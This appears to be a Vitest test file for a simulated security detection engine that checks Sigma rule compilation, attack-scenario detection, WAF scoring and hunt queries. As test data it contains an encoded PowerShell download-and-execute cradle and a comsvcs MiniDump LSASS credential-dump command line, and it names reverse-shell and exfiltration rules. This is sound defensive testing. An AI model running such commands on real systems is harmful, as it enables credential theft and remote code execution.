import { describe, expect, it } from 'vitest'
import { Engine } from '@/lib/engine/engine'
import { compileRule } from '@/lib/engine/sigma'
import { compileHunt } from '@/lib/engine/hunt'
import { inspect, WAF_PRESETS } from '@/lib/engine/waf'
import { encodePowerShell, sha256 } from '@/lib/engine/util'
import type { SecEvent } from '@/lib/engine/types'

const NOW = 1_795_000_000
const fresh = () => new Engine({ startSec: NOW - 5400, nowSec: NOW })

const proc = (fields: Record<string, string | number>): SecEvent => ({
  id: 'T1', ts: 0, sensor: 'Sysmon', host: 'h', message: '', logsource: { product: 'windows', category: 'process_creation' }, fields,
})

describe('Sigma compiler', () => {
  it('matches the UTF16 base64offset form of a PowerShell cradle at any byte offset', () => {
    const rule = compileRule(`title: t
logsource:
  product: windows
  category: process_creation
detection:
  sel:
    CommandLine|wide|base64offset|contains: 'DownloadString'
  condition: sel`)
    for (const prefix of ['', 'a', 'ab']) {
      const cmd = `powershell -enc ${encodePowerShell(`${prefix}IEX (New-Object Net.WebClient).DownloadString('http://x')`)}`
      expect(rule.test!(proc({ CommandLine: cmd }))).toBe(true)
    }
    expect(rule.test!(proc({ CommandLine: `powershell -enc ${encodePowerShell('Get-Service')}` }))).toBe(false)
  })

  it('supports wildcards, cidr, numeric modifiers and boolean conditions', () => {
    const rule = compileRule(`title: t
logsource:
  product: windows
  category: process_creation
detection:
  sel_img:
    Image|endswith: '\\rundll32.exe'
  sel_cli:
    CommandLine: '*comsvcs*MiniDump*'
  net:
    DestinationIp|cidr: '10.0.0.0/8'
  big:
    Size|gte: 100
  condition: all of sel_* and not net or big`)
    expect(rule.test!(proc({ Image: 'C:\\Windows\\System32\\rundll32.exe', CommandLine: 'rundll32 comsvcs.dll, MiniDump 1 x full' }))).toBe(true)
    expect(rule.test!(proc({ Image: 'C:\\Windows\\System32\\rundll32.exe', CommandLine: 'rundll32 comsvcs.dll, MiniDump', DestinationIp: '10.1.2.3' }))).toBe(false)
    expect(rule.test!(proc({ Size: 150 }))).toBe(true)
  })

  it('reports helpful errors for broken rules', () => {
    expect(() => compileRule('title: x\nlogsource:\n  category: dns\ndetection:\n  a:\n    q: 1\n  condition: a and b')).toThrow(/no such search identifier/)
    expect(() => compileRule('title: x\nlogsource:\n  category: dns\ndetection:\n  a:\n    q|nope: 1\n  condition: a')).toThrow(/Unsupported modifier/)
  })
})

describe('Detection engine', () => {
  it('replays the seeded history deterministically', () => {
    const a = fresh()
    const b = new Engine({ startSec: a.startSec, journal: a.journal, nowSec: NOW })
    expect(b.alerts.map((x) => x.id + x.ruleId)).toEqual(a.alerts.map((x) => x.id + x.ruleId))
    expect(a.verifyAudit().ok).toBe(true)
  })

  it.each([
    ['phish-ransom', ['office_spawn_shell', 'ps_encoded_cradle', 'lsass_comsvcs_dump', 'psexec_service', 'shadow_copy_delete', 'eventlog_cleared']],
    ['web-compromise', ['waf_sqli', 'sqli_success', 'webshell_upload', 'webserver_shell', 'linux_reverse_shell']],
    ['ssh-exfil', ['ssh_bruteforce', 'ssh_bruteforce_success', 'db_archive_staging', 'dns_tunnel_volume']],
  ])('detects the %s scenario with the expected rules', (id, expected) => {
    const e = fresh()
    const run = e.launch(id)
    e.advanceTo(NOW + 80)
    expect(run.status).toBe('completed')
    const fired = new Set(run.steps.flatMap((s) => s.detectedBy))
    for (const r of expected) expect(fired).toContain(r)
    expect(run.incidentId).toBeDefined()
    expect(e.incidentById.get(run.incidentId!)!.severity).toBe('critical')
  })

  it('breaks the kill chain when the analyst responds', () => {
    const e = fresh()
    const run = e.launch('phish-ransom')
    e.advanceTo(NOW + 20)
    e.record({ kind: 'action', action: 'disable_account', target: 'CORP\\svc_backup', actor: 'test' })
    e.advanceTo(NOW + 80)
    expect(run.status).toBe('contained')
    expect(run.steps[5].state).toBe('prevented')
    expect(run.steps[7].state).toBe('skipped')
  })

  it('blocks the web attack when the WAF is switched to blocking mode', () => {
    const e = fresh()
    e.record({ kind: 'action', action: 'waf_mode', target: 'api-staging-01', mode: 'blocking', actor: 'test' })
    const run = e.launch('web-compromise')
    e.advanceTo(NOW + 80)
    expect(run.steps[1].state).toBe('prevented')
  })
})

describe('WAF, hunting and hashing', () => {
  it('scores CRS style payloads and lets clean traffic through', () => {
    expect(inspect(WAF_PRESETS[0].req).action).toBe('allow')
    for (const p of WAF_PRESETS.slice(1)) expect(inspect(p.req).score).toBeGreaterThanOrEqual(5)
    expect(inspect(WAF_PRESETS[1].req, 5, 'detection').action).toBe('log')
  })

  it('parses hunt queries with boolean logic and comparisons', () => {
    const e = fresh()
    const q = compileHunt('sensor:nginx (sc-status>=400 OR cs-uri-query:*union*) -c-ip:10.*')
    expect(e.events.filter(q).every((x) => x.sensor === 'nginx')).toBe(true)
  })

  it('computes SHA 256 test vectors', () => {
    expect(sha256('abc')).toBe('ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad')
    expect(sha256('')).toBe('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
  })
})
